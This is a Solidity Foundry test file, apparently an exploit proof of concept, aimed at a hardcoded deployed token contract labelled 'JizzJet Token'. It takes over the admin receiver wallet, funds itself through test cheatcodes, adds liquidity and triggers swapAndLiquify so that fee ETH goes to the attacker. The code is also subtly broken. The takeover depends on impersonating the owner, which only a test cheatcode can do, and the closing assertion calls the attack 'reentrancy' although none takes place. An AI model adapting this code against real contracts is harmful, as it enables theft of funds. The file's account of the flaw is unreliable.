// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IJizzJet {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function _adminWalletAddress() external view returns (address);
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function numTokensSellToAddToLiquidity() external view returns (uint256);
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
}



interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker;
    IJizzJet target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
        target = IJizzJet(TARGET);
        vm.label(TARGET, "JizzJet Token");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get owner and impersonate
        address owner = target.owner();
        console.log("Owner:", owner);

        // Set attacker as admin wallet
        vm.startPrank(owner);
        target._setReceiverWallet(payable(attacker));
        vm.stopPrank();

        // Verify admin is now attacker
        address adminWallet = target._adminWalletAddress();
        console.log("Admin wallet:", adminWallet);
        require(adminWallet == attacker, "Admin not set to attacker");

        // Get token threshold
        uint256 threshold = target.numTokensSellToAddToLiquidity();
        console.log("Threshold:", threshold);

        // Get router and pair
        address router = address(target.uniswapV2Router());
        address pair = target.uniswapV2Pair();
        console.log("Router:", router);
        console.log("Pair:", pair);

        // Inject tokens and ETH to attacker for initial liquidity
        deal(TARGET, attacker, threshold * 10);
        deal(attacker, 100 ether);
        console.log("Attacker tokens:", target.balanceOf(attacker));
        console.log("Attacker ETH:", address(attacker).balance);

        // Approve router to spend tokens
        target.approve(router, type(uint256).max);

        // Add initial liquidity to the pair (needed for swap to work)
        IUniswapV2Router02(router).addLiquidityETH{
            value: 50 ether
        }(
            TARGET,
            threshold * 5,
            0,
            0,
            attacker,
            block.timestamp + 1 hours
        );
        console.log("Liquidity added");

        // Record initial ETH balance
        uint256 initialEth = address(attacker).balance;
        console.log("Initial ETH balance:", initialEth);

        // Transfer tokens to contract to accumulate balance above threshold
        // This triggers swapAndLiquify because from != uniswapV2Pair and balance >= threshold
        target.transfer(TARGET, threshold * 2);

        // Check profit - attacker should have received ETH from sendBNBToAdmin
        uint256 finalEth = address(attacker).balance;
        console.log("Final ETH balance:", finalEth);
        console.log("Profit:", finalEth - initialEth);

        assertGt(finalEth, initialEth, "Attacker did not profit from reentrancy");
    }

    receive() external payable {}

    fallback() external payable {}
}

